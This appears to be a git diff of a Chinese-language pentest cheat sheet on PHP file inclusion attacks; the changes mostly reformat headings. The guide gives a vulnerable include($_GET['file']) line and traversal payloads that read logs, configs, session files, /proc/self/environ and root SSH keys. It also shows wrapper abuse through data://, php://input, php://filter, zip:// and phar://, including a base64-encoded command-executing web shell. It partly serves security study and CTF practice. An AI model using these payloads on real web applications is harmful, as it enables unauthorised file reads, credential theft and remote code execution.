@@ -3,19 +3,18 @@ title: "php 文件包含"
 date: 2016-02-24 16:47
 ---
 
-## 与文件包含相关的函数
+## 0x01 与文件包含相关的函数
 
-require找不到被包含的文件时会产生致命错误，并停止脚本运行。
+```
+require         找不到被包含的文件时会产生致命错误，并停止脚本运行。
+include         找不到被包含的文件时只会产生警告，脚本将继续运行。
+include_once    与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
+require_once    与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含
+```
 
-include找不到被包含的文件时只会产生警告，脚本将继续运行。
+## 0x02 本地文件包含(LFI--Local File Include)
 
-include_once与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
-
-require_once与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含
-
-## 本地文件包含(LFI--Local File Include)
-
-* 普通本地包含
+### 普通本地包含
 
 只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容
 
@@ -26,9 +25,9 @@ require_once与require类似，唯一区别是如果该文件中的代码已经�
 <?php include($_GET['file']); ?>
 ```
 
-利用
+** 利用 **
 
-* 注入有效 php 代码
+#### 注入有效 php 代码
 
 ```
 echo "<?php phpinfo();" >> lfi.txt
@@ -37,7 +36,7 @@ echo "<?php phpinfo();" >> lfi.txt
 http://127.0.0.1/lfi.php?file=lfi.txt
 ```
 
-* 目录遍历
+#### 目录遍历
 
 ```
 # linux 这两个文件存储着所有文件的路径，需要root权限
@@ -45,25 +44,25 @@ http://127.0.0.1/lfi.php?file=lfi.txt
 ?file=../../../../../../../var/lib/locate.db
 ```
 
-* 包含错误日志
+#### 包含错误日志
 
 ```
 ?ile=../../../../../../../../var/log/apache/error.log
 ```
 
-* 获取web目录或配置文件
+#### 获取web目录或配置文件
 
 ```
 ?file=../../../../../../../../usr/local/apache2/conf/httpd.conf
 ```
 
-* 包含上传附件
+#### 包含上传附件
 
 ```
 ?file=../attachment/media/xx.file
 ```
 
-* 读取 session 文件
+#### 读取 session 文件
 
 ```
 ?file=../../../../../../../tmp/sess_xxxxx
@@ -71,7 +70,7 @@ http://127.0.0.1/lfi.php?file=lfi.txt
 
 session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell
 
-* 如果拥有root权限还可以试试读这些东西：
+#### 如果拥有root权限还可以试试读这些东西：
 
 ```
 /root/.ssh/authorized_keys
@@ -97,7 +96,7 @@ session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有
 /proc/config.gz
 ```
 
-## 截断本地包含
+### 截断本地包含
 
 样例：
 
@@ -152,20 +151,20 @@ windows在文件名后加/.  或 \.都是可以的
 
 > gpc=off 和 php 版本限制
 
-## 远程包含
+## 0x03 远程包含
 
 allow_url_include=On 就是远程文件包含，Off就是本地文件包含
 
 > “zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)
 
-### php 自带协议
+## 0x04 php 自带协议
 
 
-* ** data:// ** 
+### ** data:// ** 
 
 Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur
 
-> php>5.2 ,allow_url_include=On
+> php>5.2, allow_url_include=On
 
 ```
 # base64 decode is 'I love PHP\n'
@@ -204,7 +203,7 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxp
 PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
 ```
 
-* ** php://input ** -- 
+### ** php://input ** -- 
 
 可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)
 
@@ -246,7 +245,7 @@ result: ip information
 <?php echo base64_encode(file_get_contents("solution.php"));?>
 ```
 
-* ** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
+### ** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
 
 > php5.0以上
 
@@ -274,23 +273,37 @@ $ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://f
 
 这个参数采用一个或以管道符 | 分隔的多个过滤器名称
 
-* ** php://fd **
+### ** php://fd **
 
 > php 5.3.6中新增加
 
-* zip://
+### zip://
+
+> allow_url_fopen=no
 
 ```
-# %23 --> #, 截断
-?f=zip://archive.zip%23dir/file.txt 
+# zip 内含目录
+zip://archive.zip#dir/file.txt 
+
+# url 中使用 "%23"(#)
+?f=zip://path_to_zip%23inside_file_name
 ```
 
 文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩
+
 ```
 zip -0 1.zip shell.php
 ```
 
-* phar://
+** 额外支持 **
+
+```
+fopen('zip://path/xx.zip#inside_file_name')
+file_get_contents()
+imagecreatefromgif()
+```
+
+### phar://
 
 ```
 ?f=phar://php.zip/php.jpg
@@ -318,7 +331,7 @@ DirectoryIterator(“glob://ext/spl/examples/*.php”)
 ?>
 ```
 
-* file://
+### file://
 
 越权访问本地文件
 
@@ -367,7 +380,7 @@ function upload_please_by_url($url)
 
 当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的
 
-## 包含Session文件
+## 0x04 包含Session文件
 
 包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。
 
@@ -381,7 +394,7 @@ PHP默认生成的Session文件往往存放在/tmp目录下
 /tmp/sess_SESSIONID
 ```
 
-## 包含/proc/self/environ文件
+## 0x05 包含/proc/self/environ文件
 
 包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容
 
@@ -389,7 +402,7 @@ PHP默认生成的Session文件往往存放在/tmp目录下
 http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ
 ```
 
-## 日记包含高级利用
+## 0x06 日记包含高级利用
 
 [济南大学主站本地文件包含导致代码执行][3]
 
